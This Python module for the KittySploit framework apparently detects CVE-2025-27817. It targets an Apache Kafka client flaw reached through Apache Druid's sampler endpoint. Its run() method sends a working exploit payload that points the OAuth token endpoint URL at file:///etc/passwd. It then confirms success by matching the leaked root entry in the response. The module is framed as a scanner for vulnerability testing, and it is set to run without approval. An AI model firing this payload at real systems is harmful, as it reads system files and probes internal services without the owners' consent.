#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Kafka Client contains arbitrary file read and server-side request forgery caused by untrusted configura."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Kafka Client - Arbitrary File Read Detection',
        'description': 'Apache Kafka Client contains arbitrary file read and server-side request forgery caused by untrusted configuration of sasl.oauthbearer.token.endpoint.url and sasl.oauthbearer.jwks.endpoint.url, letting attackers read files or send requests to unintended locations, exploit requires untrusted party to specify client configurations.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'apache', 'lfi', 'file-read', 'ssrf', 'kafka', 'oss', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/kk12-30/CVE-2025-27817', 'https://nvd.nist.gov/vuln/detail/CVE-2025-27817'],
        'cve': 'CVE-2025-27817',
    }

    def run(self):
        path = '/druid/indexer/v1/sampler?for=connect'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"type":"kafka","spec":{"type":"kafka","ioConfig":{"type":"kafka","consumerProperties":{"bootstrap.servers":"127.0.0.1:6666","sasl.mechanism":"OAUTHBEARER","security.protocol":"SASL_SSL","sasl.login.callback.handler.class":"org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler","sasl.oauthbearer.token.endpoint.url":"file:///etc/passwd","sasl.jaas.config":"org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required sasl.oauthbearer.token.endpoint.url=\\"http://127.0.0.1:9999/token\\" sasl.oauthbearer.jwks.endpoint.url=\\"http://127.0.0.1:9999/jwks\\" sasl.oauthbearer.client.id=your-client-id sasl.oauthbearer.client.secret=your-client-secret sasl.oauthbearer.expected.audience=kafka sasl.oauthbearer.expected.issuer=\\"http://127.0.0.1:9999\\" useFirstPass=true serviceName=kafka debug=true;"},"topic":"test","useEarliestOffset":true,"inputFormat":{"type":"regex","pattern":"([\\\\s\\\\S]*)","listDelimiter":"","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{},"granularitySpec":{"rollup":false}},"tuningConfig":{"type":"kafka"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}\n')
        if not r or r.status_code != 400:
            return False
        body = r.text or ""
        body_all = ('Malformed JWT provided', 'RecordSupplier',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in body for m in body_all)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Apache Kafka Client - Arbitrary File Read detected', path=path)
            return True
        return False

